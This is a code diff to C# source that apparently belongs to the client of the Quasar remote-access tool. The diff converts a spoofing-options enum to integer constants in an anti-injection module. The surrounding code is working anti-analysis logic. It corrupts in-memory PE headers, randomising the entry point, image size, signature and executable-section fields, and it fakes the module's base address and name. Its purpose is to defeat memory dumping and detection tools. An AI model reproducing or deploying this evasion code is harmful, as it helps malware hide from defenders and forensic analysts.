@@ -10,22 +10,21 @@ using static Quasar.Client.Anti.Helper.Structs;
 
 namespace Quasar.Client.Anti.Injection
 {
-    [Flags]
-    public enum Spoofs
+    public static class Spoofs
     {
-        BaseAddress = 1 << 0,
-        ModuleName = 1 << 1,
-        AddressOfEntryPoint = 1 << 2,
-        SizeOfImage = 1 << 3,
-        NumberOfSections = 1 << 4,
-        ImageMagic = 1 << 5,
-        NotExecutableNorDll = 1 << 6,
-        PESignature = 1 << 7,
-        ExecutableSectionName = 1 << 8,
-        ExecutableSectionRawSize = 1 << 9,
-        ExecutableSectionRawPointer = 1 << 10,
-        ClearExecutableSectionCharacteristics = 1 << 11,
-        ExecutableSectionVirtualSize = 1 << 12,
+        public const int BaseAddress = 1 << 0;
+        public const int ModuleName = 1 << 1;
+        public const int AddressOfEntryPoint = 1 << 2;
+        public const int SizeOfImage = 1 << 3;
+        public const int NumberOfSections = 1 << 4;
+        public const int ImageMagic = 1 << 5;
+        public const int NotExecutableNorDll = 1 << 6;
+        public const int PESignature = 1 << 7;
+        public const int ExecutableSectionName = 1 << 8;
+        public const int ExecutableSectionRawSize = 1 << 9;
+        public const int ExecutableSectionRawPointer = 1 << 10;
+        public const int ClearExecutableSectionCharacteristics = 1 << 11;
+        public const int ExecutableSectionVirtualSize = 1 << 12;
     }
 
     public class AntiInjection
@@ -159,23 +158,24 @@ namespace Quasar.Client.Anti.Injection
             return new string(NewModule);
         }
 
-        private static bool IsFlagsSet(Spoofs SpoofOptions, Spoofs[] spoofs)
+        private static bool IsFlagsSet(int SpoofOptions, int[] spoofs)
         {
-            foreach (Spoofs spoofa in spoofs)
+            foreach (int spoofa in spoofs)
             {
-                if (SpoofOptions.HasFlag(spoofa))
+                if ((SpoofOptions & spoofa) == spoofa)
                     return true;
             }
             return false;
         }
 
-        private static bool IsPE_FlagsSet(Spoofs SpoofOptions)
+        private static bool IsPE_FlagsSet(int SpoofOptions)
         {
-            Spoofs[] spoofs = {
-        Spoofs.AddressOfEntryPoint, Spoofs.SizeOfImage, Spoofs.ExecutableSectionRawSize,
-        Spoofs.ExecutableSectionRawPointer, Spoofs.PESignature, Spoofs.ImageMagic,
-        Spoofs.NotExecutableNorDll, Spoofs.NumberOfSections, Spoofs.ClearExecutableSectionCharacteristics,
-        Spoofs.ExecutableSectionVirtualSize };
+            int[] spoofs = {
+                Spoofs.AddressOfEntryPoint, Spoofs.SizeOfImage, Spoofs.ExecutableSectionRawSize,
+                Spoofs.ExecutableSectionRawPointer, Spoofs.PESignature, Spoofs.ImageMagic,
+                Spoofs.NotExecutableNorDll, Spoofs.NumberOfSections, Spoofs.ClearExecutableSectionCharacteristics,
+                Spoofs.ExecutableSectionVirtualSize
+            };
             return IsFlagsSet(SpoofOptions, spoofs);
         }
 
@@ -185,7 +185,7 @@ namespace Quasar.Client.Anti.Injection
         /// <param name="ModuleName">The module name which we will change it's information. if left null, we get the main module of the process.</param>
         /// <param name="SpoofOptions">The spoofing options to apply.</param>
         /// <returns>Returns true if successfully changed the module info, otherwise false.</returns>
-        public static bool ChangeModuleInfo(string ModuleName, Spoofs SpoofOptions)
+        public static bool ChangeModuleInfo(string ModuleName, int SpoofOptions)
         {
             try
             {
@@ -212,9 +212,10 @@ namespace Quasar.Client.Anti.Injection
                     {
                         if (IsPE_FlagsSet(SpoofOptions))
                         {
-                            Spoofs[] SectionSpoof = {
-                        Spoofs.ExecutableSectionName, Spoofs.ExecutableSectionRawPointer,
-                        Spoofs.ExecutableSectionRawSize, Spoofs.ClearExecutableSectionCharacteristics, Spoofs.ExecutableSectionVirtualSize};
+                            int[] SectionSpoof = {
+                                Spoofs.ExecutableSectionName, Spoofs.ExecutableSectionRawPointer,
+                                Spoofs.ExecutableSectionRawSize, Spoofs.ClearExecutableSectionCharacteristics, Spoofs.ExecutableSectionVirtualSize
+                            };
 
                             IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(hModule);
                             IntPtr pNtHeaders = IntPtr.Add(hModule, dosHeader.e_lfanew);
@@ -222,19 +223,19 @@ namespace Quasar.Client.Anti.Injection
                             if (IntPtr.Size == 8)
                             {
                                 IMAGE_NT_HEADERS64 NtHeadersStruct = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(pNtHeaders);
-                                if (SpoofOptions.HasFlag(Spoofs.AddressOfEntryPoint))
+                                if ((SpoofOptions & Spoofs.AddressOfEntryPoint) == Spoofs.AddressOfEntryPoint)
                                     NtHeadersStruct.OptionalHeader.AddressOfEntryPoint = (uint)RandGen.Next(0x1000, 0x2000);
 
-                                if (SpoofOptions.HasFlag(Spoofs.NumberOfSections))
+                                if ((SpoofOptions & Spoofs.NumberOfSections) == Spoofs.NumberOfSections)
                                     NtHeadersStruct.FileHeader.NumberOfSections = (ushort)RandGen.Next(NtHeadersStruct.FileHeader.NumberOfSections, NtHeadersStruct.FileHeader.NumberOfSections + 99);
 
-                                if (SpoofOptions.HasFlag(Spoofs.ImageMagic))
+                                if ((SpoofOptions & Spoofs.ImageMagic) == Spoofs.ImageMagic)
                                     NtHeadersStruct.OptionalHeader.Magic = (ushort)RandGen.Next(0, int.MaxValue);
 
-                                if (SpoofOptions.HasFlag(Spoofs.SizeOfImage))
+                                if ((SpoofOptions & Spoofs.SizeOfImage) == Spoofs.SizeOfImage)
                                     NtHeadersStruct.OptionalHeader.SizeOfImage = (uint)RandGen.Next((int)NtHeadersStruct.OptionalHeader.SizeOfImage, (int)(NtHeadersStruct.OptionalHeader.SizeOfImage + 0x10000));
 
-                                if (SpoofOptions.HasFlag(Spoofs.NotExecutableNorDll))
+                                if ((SpoofOptions & Spoofs.NotExecutableNorDll) == Spoofs.NotExecutableNorDll)
                                 {
                                     ushort IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
                                     ushort IMAGE_FILE_DLL = 0x2000;
@@ -242,7 +243,7 @@ namespace Quasar.Client.Anti.Injection
                                     NtHeadersStruct.FileHeader.Characteristics &= (ushort)~IMAGE_FILE_DLL;
                                 }
 
-                                if (SpoofOptions.HasFlag(Spoofs.PESignature))
+                                if ((SpoofOptions & Spoofs.PESignature) == Spoofs.PESignature)
                                     NtHeadersStruct.Signature = 0x4D5A0000;
 
                                 if (IsFlagsSet(SpoofOptions, SectionSpoof))
@@ -257,19 +258,19 @@ namespace Quasar.Client.Anti.Injection
                                         uint IMAGE_SCN_CNT_CODE = 0x00000020;
                                         if ((SectionHeader.Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE)
                                         {
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionName))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionName) == Spoofs.ExecutableSectionName)
                                                 SectionHeader.Name = Encoding.ASCII.GetBytes($".{GenerateRandomString()}");
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionRawPointer))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionRawPointer) == Spoofs.ExecutableSectionRawPointer)
                                                 SectionHeader.PointerToRawData = (uint)RandGen.Next(0, int.MaxValue);
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionRawSize))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionRawSize) == Spoofs.ExecutableSectionRawSize)
                                                 SectionHeader.SizeOfRawData = (uint)RandGen.Next(0, int.MaxValue);
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ClearExecutableSectionCharacteristics))
+                                            if ((SpoofOptions & Spoofs.ClearExecutableSectionCharacteristics) == Spoofs.ClearExecutableSectionCharacteristics)
                                                 SectionHeader.Characteristics = 0;
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionVirtualSize))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionVirtualSize) == Spoofs.ExecutableSectionVirtualSize)
                                                 SectionHeader.VirtualSize = (uint)RandGen.Next((int)SectionHeader.VirtualSize, (int)SectionHeader.VirtualSize + 0x10000);
 
                                             Utils.WriteStructToPtr(SectionHeader, pSectionHeader, true, true);
@@ -285,19 +286,19 @@ namespace Quasar.Client.Anti.Injection
                             else
                             {
                                 IMAGE_NT_HEADERS32 NtHeadersStruct = Marshal.PtrToStructure<IMAGE_NT_HEADERS32>(pNtHeaders);
-                                if (SpoofOptions.HasFlag(Spoofs.AddressOfEntryPoint))
+                                if ((SpoofOptions & Spoofs.AddressOfEntryPoint) == Spoofs.AddressOfEntryPoint)
                                     NtHeadersStruct.OptionalHeader.AddressOfEntryPoint = (uint)RandGen.Next(0x1000, 0x2000);
 
-                                if (SpoofOptions.HasFlag(Spoofs.NumberOfSections))
+                                if ((SpoofOptions & Spoofs.NumberOfSections) == Spoofs.NumberOfSections)
                                     NtHeadersStruct.FileHeader.NumberOfSections = (ushort)RandGen.Next(NtHeadersStruct.FileHeader.NumberOfSections, NtHeadersStruct.FileHeader.NumberOfSections + 99);
 
-                                if (SpoofOptions.HasFlag(Spoofs.ImageMagic))
+                                if ((SpoofOptions & Spoofs.ImageMagic) == Spoofs.ImageMagic)
                                     NtHeadersStruct.OptionalHeader.Magic = (ushort)RandGen.Next(0, int.MaxValue);
 
-                                if (SpoofOptions.HasFlag(Spoofs.SizeOfImage))
+                                if ((SpoofOptions & Spoofs.SizeOfImage) == Spoofs.SizeOfImage)
                                     NtHeadersStruct.OptionalHeader.SizeOfImage = (uint)RandGen.Next((int)NtHeadersStruct.OptionalHeader.SizeOfImage, (int)(NtHeadersStruct.OptionalHeader.SizeOfImage + 0x10000));
 
-                                if (SpoofOptions.HasFlag(Spoofs.NotExecutableNorDll))
+                                if ((SpoofOptions & Spoofs.NotExecutableNorDll) == Spoofs.NotExecutableNorDll)
                                 {
                                     ushort IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002;
                                     ushort IMAGE_FILE_DLL = 0x2000;
@@ -305,7 +306,7 @@ namespace Quasar.Client.Anti.Injection
                                     NtHeadersStruct.FileHeader.Characteristics &= (ushort)~IMAGE_FILE_DLL;
                                 }
 
-                                if (SpoofOptions.HasFlag(Spoofs.PESignature))
+                                if ((SpoofOptions & Spoofs.PESignature) == Spoofs.PESignature)
                                     NtHeadersStruct.Signature = 0x4D5A0000;
 
                                 if (IsFlagsSet(SpoofOptions, SectionSpoof))
@@ -320,19 +321,19 @@ namespace Quasar.Client.Anti.Injection
                                         uint IMAGE_SCN_CNT_CODE = 0x00000020;
                                         if ((SectionHeader.Characteristics & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE)
                                         {
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionName))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionName) == Spoofs.ExecutableSectionName)
                                                 SectionHeader.Name = Encoding.ASCII.GetBytes($".{GenerateRandomString()}");
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionRawPointer))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionRawPointer) == Spoofs.ExecutableSectionRawPointer)
                                                 SectionHeader.PointerToRawData = (uint)RandGen.Next(0, int.MaxValue);
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionRawSize))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionRawSize) == Spoofs.ExecutableSectionRawSize)
                                                 SectionHeader.SizeOfRawData = (uint)RandGen.Next(0, int.MaxValue);
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ClearExecutableSectionCharacteristics))
+                                            if ((SpoofOptions & Spoofs.ClearExecutableSectionCharacteristics) == Spoofs.ClearExecutableSectionCharacteristics)
                                                 SectionHeader.Characteristics = 0;
 
-                                            if (SpoofOptions.HasFlag(Spoofs.ExecutableSectionVirtualSize))
+                                            if ((SpoofOptions & Spoofs.ExecutableSectionVirtualSize) == Spoofs.ExecutableSectionVirtualSize)
                                                 SectionHeader.VirtualSize = (uint)RandGen.Next((int)SectionHeader.VirtualSize, (int)SectionHeader.VirtualSize + 0x10000);
 
                                             Utils.WriteStructToPtr(SectionHeader, pSectionHeader, true, true);
@@ -347,12 +348,12 @@ namespace Quasar.Client.Anti.Injection
                             }
                         }
 
-                        if (SpoofOptions.HasFlag(Spoofs.BaseAddress))
+                        if ((SpoofOptions & Spoofs.BaseAddress) == Spoofs.BaseAddress)
                         {
                             TableEntry.DllBase = (IntPtr)(RandGen.Next(0x100000 / 0x1000, 0x7FFF000 / 0x1000) * 0x1000);
                         }
 
-                        if (SpoofOptions.HasFlag(Spoofs.ModuleName))
+                        if ((SpoofOptions & Spoofs.ModuleName) == Spoofs.ModuleName)
                         {
                             IntPtr FakeDllBuffer = Marshal.StringToHGlobalUni(Fake);
                             TableEntry.FullDllName.Buffer = FakeDllBuffer;
